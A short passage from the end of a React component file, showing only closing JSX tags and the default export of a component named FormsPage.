        </div>
      )}
    </div>
  );
};

export default FormsPage;
